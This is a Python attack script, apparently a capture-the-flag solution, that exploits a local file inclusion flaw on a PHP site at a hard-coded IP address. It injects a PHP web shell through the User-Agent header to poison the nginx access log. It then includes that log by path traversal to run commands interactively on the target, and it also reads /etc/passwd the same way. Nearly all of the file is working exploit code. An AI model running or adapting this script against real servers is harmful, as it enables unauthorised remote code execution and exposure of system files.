#!/usr/bin/python3

from pprint import pprint
import requests
from urllib.parse import quote, unquote
from pwn import *


URL = "http://188.166.168.58:32484/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log"



def malicious_request() -> None:
    log.info("sending malicious headers")
    headers = {"User-Agent":"<?php system($_GET['cmd']); ?>"}
    
    # now perform another requests
    requests.get(url=URL, headers=headers)
    

    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"}
    
    
    
    
    log.progress("remote code execution")
    while True:
        
        cmd = input("user#> ")
        if cmd == "nothing":
            break
        ress = requests.get(url=URL+f"&cmd={cmd}", headers=headers)
        print(ress.text)
    


def make_requests():
    """One of the most common kind of attacks
    using local file inclusion (LFI) it's 
    the log poisoning, consists in send a malicious header
    with the request paramenter GET or POST and
    try to send the header like User-Agent with some malicious code
    in some cases the most common language for this attack
    it's the fucking php :v"""
    
    # this is an example of the malicious header
    # User-Agent: <?php system($_GET['cmd']); ?>
    # curl http://ip:port?cmd=<malicious code to execute>
    # payload = "php://filter/convert.base64-encode/resource=/etc/passwd%00"
    payload = "../../../../../../../../etc/passwd"
    payload = quote(payload)
    sess = requests.Session()
    ress = sess.get(url=URL+payload)
    print(ress.text)
    print(ress.url)



def main():
    try:
        malicious_request()
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        print("""\t\t\n\n [*] Exiting...""")
        exit(0)



if __name__ == "__main__":
    main()
